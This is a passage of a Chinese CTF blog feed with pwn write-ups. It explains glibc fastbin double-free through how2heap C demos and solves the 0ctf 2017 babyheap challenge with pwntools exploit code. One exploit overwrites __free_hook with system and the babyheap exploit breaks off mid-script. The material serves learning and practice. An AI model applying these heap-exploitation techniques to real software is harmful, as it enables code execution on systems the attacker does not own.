class="string">'6'</span>,p8(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">15</span>+p64(free_hook<span class="number">-0xb58</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xb30</span>)<span class="comment">#7</span></span><br><span class="line">fill(<span class="string">'7'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line">fill(<span class="string">'8'</span>,p64(<span class="number">0</span>)+p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">fast()</span><br><span class="line">leak()</span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这算是弥补了，上篇文章的遗憾吧。了解另一种通过<code>__realloc_hook</code>利用one_gatget方式。更重要的是利用<code>__free_hook</code>来写shell来调用。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/hoi0714/article/details/7909488" target="_blank" rel="noopener">https://blog.csdn.net/hoi0714/article/details/7909488</a></p><p><a href="https://bbs.pediy.com/thread-246786.htm#msg_header_h2_3" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm#msg_header_h2_3</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin二次释放——学pwn小记(5)</title>
      <link href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/"/>
      <url>/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/</url>
      
        <content type="html"><![CDATA[<p>在学习pwn时,在接触到堆的知识点时明显感觉自己遇到了瓶颈了。面对各种bin、chunk、glibc感觉一脸蒙蔽,有的感觉不到如何将这些知识用到题目中来.感觉从how2heap学到知识和ctfwiki的知识及pwn爷爷们的python exp代码有的连不上.(tcl!)就这样迷茫了几个月,偶然间在拜读《CTF 竞赛权威指南 pwn篇》的fastbin二次释放时，突然有顿悟，故做个小笔记。（萌新写作欢迎pwn佬指点）</p><a id="more"></a><h2 id="fastbin-知识点"><a href="#fastbin-知识点" class="headerlink" title="fastbin 知识点"></a>fastbin 知识点</h2><h3 id="chunk-与bin"><a href="#chunk-与bin" class="headerlink" title="chunk 与bin"></a>chunk 与bin</h3><p>chunk 是glibc 管理内存的基本单位.整个堆在初始化后会被当成一个free chunk,成为top chunk.用户在分配内存时,如果没有bins没有合适的chunk就会在top chunk中分配.在释放内存时,glibc会视情况将释放的chunk与相邻free chunk合并加入合适的bin中 .</p><p>bin是glibc将被释放掉的chunk(free chunk) 重新组织起来的<strong>链表</strong>.当用户请求新内存时,会先分配bin 链表中合适chunk.bin一共有4种 Fast bin 、 Small bin 、Large bin 、Unsertd bin。</p><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>astbin的chunksize为16到80字节，在内存分配和释放中，fastbin是速度最快的。fastbin的两个特点：<br>1、fastbin的个数为10个。<br>2、fastbin由单链表构成，无论是添加还是移除fastchunk，都对链表尾进行操作，采取后入先出算法。fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点。如图所示：</p><p><img src="image-20210312105700389.png" alt="image-20210312105700389"></p><h3 id="fastbin二次释放"><a href="#fastbin二次释放" class="headerlink" title="fastbin二次释放"></a>fastbin二次释放</h3><p>成因：fastbin是单链表结构，当chunk 释放时不会清空next chunk 的prev_inuse.</p><p>作用：获得fd指针、修改任意位置chunk</p><p>利用条件：可以控制chunk里的内容。</p><h4 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h4><p>由于fastbin_dup 的检测机制仅仅验证了当前块是否有与链表头的块相同及当前块size部大小是否与链表头的size部大小相同。因此我们可以free 两个相同大小chunk 再free 第一个被free的chunk 从而绕过检测。（fastbin 是后入先出算法的）</p><p>借用how2heap的fastbin_dup c语言代码来描述这个过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb这个过程，执行到代码19行时，chunk a 进入fastbin ，根据fastbin特性chunk a成为fastbin的表头。</p><p><img src="image-20210312114855200.png" alt="image-20210312114855200"></p><p>执行到代码25行时，chunk b 进入fastbin ，根据fastbin特性chunk b成为fastbin的表头。</p><p><img src="image-20210312115643868.png" alt="image-20210312115643868"></p><p>执行到代码28行时，我们再次free a ，可以看到chunk a再次被释放成为fastbin的表头。</p><p><img src="image-20210312120347309.png" alt="image-20210312120347309"></p><p>看到此时chunk a 的fd指向chunk b ，chunk b 的fd指向chunk a。这样我们 无论申请多少chunk其指针都会是chunk a 的指针和chunk b的指针之间。</p><h4 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h4><p>同时，libc 在分配large chunk时，如果fastbins不为空则会调用malloc_consolidate函数合并fastbin到chunk并放入 unsorted bin。再将合并后的chunk 取出放到合适的bins中。此时fastbin会被清空。</p><p>借用how2heap的fastbin_dup_consolidate c语言代码来描述这个过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行到代码10行时，chunk a 进入fastbin。 </p><p><img src="image-20210312134616539.png" alt="image-20210312134616539"></p><p>执行到代码12行时，申请了一块符合large chunk大小的内存，fastbin被初始化。</p><p><img src="image-20210312134851373.png" alt="image-20210312134851373"></p><p>执行到代码15行时，我们再次free chunk a ，我们发现fastbin中再次出现chunk a。</p><p><img src="image-20210312135411880.png" alt="image-20210312135411880"></p><p>再次申请内存时，我们获得两个指向同一个地方的chunk（同一个值的指针）</p><h4 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h4><p>由于fastbin检测不严谨导致我们可以伪造一个假fastbin来欺骗glibc。</p><p>借用how2heap的fastbin_dup_into_stack c语言代码来描述这个过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line"><span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line"><span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line"><span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line"><span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码32行前过程是fastin_dup的过程。</p><p>45到48行是伪造一个fake chunk的过错，伪造后内存如下:。</p><p><img src="image-20210312142027606.png" alt="image-20210312142027606"></p><p>此时真实的chunk处状况：</p><p><img src="image-20210312142236414.png" alt="image-20210312142236414"></p><p>这样我们就伪造一个chunk在fast bin中：</p><p><img src="image-20210312142636361.png" alt="image-20210312142636361"></p><h2 id="例题：babyheap-0ctf-2017"><a href="#例题：babyheap-0ctf-2017" class="headerlink" title="例题：babyheap_0ctf_2017"></a>例题：babyheap_0ctf_2017</h2><h3 id="学堆溢出疑问"><a href="#学堆溢出疑问" class="headerlink" title="学堆溢出疑问"></a>学堆溢出疑问</h3><p>在我学习堆时，困扰我的问题主要有以下几个：</p><p>how2heap中的c语言的漏洞，怎么通过python脚本来复现利用？</p><p>怎么泄露程序的libc版本？</p><p>如何写恶意代码？</p><p>在哪里写恶意代码?</p><p>如何让程序执行写入的恶意代码?</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="程序过程分析"><a href="#程序过程分析" class="headerlink" title="程序过程分析"></a>程序过程分析</h4><p><img src="image-20210312161854321.png" alt="image-20210312161854321"></p><p>发现题目所有保护全开.</p><p>看ida发现程序有4个功能:</p><p><img src="image-20210312161652601.png" alt="image-20210312161652601"></p><h5 id="allcocate"><a href="#allcocate" class="headerlink" title="allcocate"></a>allcocate</h5><p>allcocate 功能伪代码如下:</p><p><img src="image-20210312162822749.png" alt="image-20210312162822749"></p><p>主要是创造最多16个结构体,.每个结构体分配我们输入大小的内存(若大于0x1000则只分配0x1000).在创造一个结构体时,结构体的第一个参数会变为1,第二个参数为分配内存的大小,第三个参数为分配内存.</p><h5 id="Fill"><a href="#Fill" class="headerlink" title="Fill"></a>Fill</h5><p>Fill 功能伪代码如下:</p><p><img src="image-20210312163722236.png" alt="image-20210312163722236"></p><p>主要是让我们选择一个结构体，然后检测结构体是否被创造（第一个参数是否为1）。若第一个参数为1则然调用sub_11B2（）函数，让我们输入内容写入该结构体。</p><p>sub_11B2函数伪代码如下：</p><p><img src="image-20210312164154599.png" alt="image-20210312164154599"></p><p>发现只限制了，输入的数符数量为传入sub_11B2的第二个参数。没有管字符串是否导致溢出。</p><h5 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h5><p>Free功能伪代码如下:</p><p><img src="image-20210312164403684.png" alt="image-20210312164403684"></p><p>发现在释放结构体时，程序会先检测输入数字是否符合规范。然后检测是否被释放，符合要求后才释放内存，再将第一个和第二个参数清零。</p><h5 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h5><p>Dump功能伪代码如下：</p><p><img src="image-20210312165151718.png" alt="image-20210312165151718"></p><p>大致就是将我们输入的字符打印出来。</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>大致思路是leak出gbilc版本，写入shell ，让glibc调用。</p><h5 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h5><p>我们知道释放的chunk 会回到bins 中会有fd与bk指针指向libc中的地址，这个地址与libc的基地址是相对不变的。因此我们可以利用一个fast chunk和一个small chunk 指向一个地方,然后释放small chunk,用另一 读取地址.</p><p>我们先free掉两个fast chunk，利用堆溢出强行让第二个fast chunk fd指向small chunk,,再修改small chunk大小为0x21.</p><p><img src="image-20210312185816110.png" alt="image-20210312185816110"></p><p>这样再申请fast chunk内存，第二个new fast chunk就 指向small chunk。</p><p><img src="image-20210312190219655.png" alt="image-20210312190219655"></p><p>再利用堆溢出将small chunk大小改回0x91。在free掉small chunk，此时small chunk fd与 bk指向libc中映射的地址。再利用指向同一个地方的new fast chunk读出来。</p><p><img src="image-20210312191817225.png" alt="image-20210312191817225"></p><p>然后算出这固定偏移。</p><p><img src="image-20210312192631389.png" alt="image-20210312192631389"></p><h5 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h5><p>爆出glibc后剩下的问题就是如何写入shell和调用shell。</p><p>对于写入shell我们可以就用one_gadget,调用我们可以通过伪造一个fake  chunk复写__malloc_hook来触发。</p><p>（ps：<code>__malloc_hook</code> 是一个弱类型的函数指针，指向 <code>void *function（size_t size ,void *caller ）</code>,在调用malloc函数是会判断<code>__malloc_hook</code>是否为空，不为空则调用它）</p><p>我们通过错位偏移的方法在__malloc_hook附近伪造一个fake  chunk</p><p><img src="image-20210312195128925.png" alt="image-20210312195128925"></p><p>再利用堆溢出，在__malloc_hook位置写入one_gadget。</p><p><img src="image-20210312195737780.png" alt="image-20210312195737780"></p><p>这样程序在创建一个新chunk时，会自动调用__malloc_hook位置对应的one_gadget。</p><p><img src="image-20210312195837505.png" alt="image-20210312195837505"></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">p=process(<span class="string">'./babyheap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26886)</span></span><br><span class="line"><span class="comment">#process('./babyheap')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(num,text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.sendline(str(len(text)))</span><br><span class="line">p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">x=p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast</span><span class="params">()</span>:</span></span><br><span class="line">       </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">        </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="number">0x10</span>*<span class="string">'a'</span></span><br><span class="line">pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">pay+=p64(<span class="number">0x88</span>)+p64(<span class="number">0x88</span>)</span><br><span class="line">        pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>) </span><br><span class="line">        pay+=p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="string">'0'</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">'3'</span>,pay)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">fill(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line"></span><br><span class="line"><span 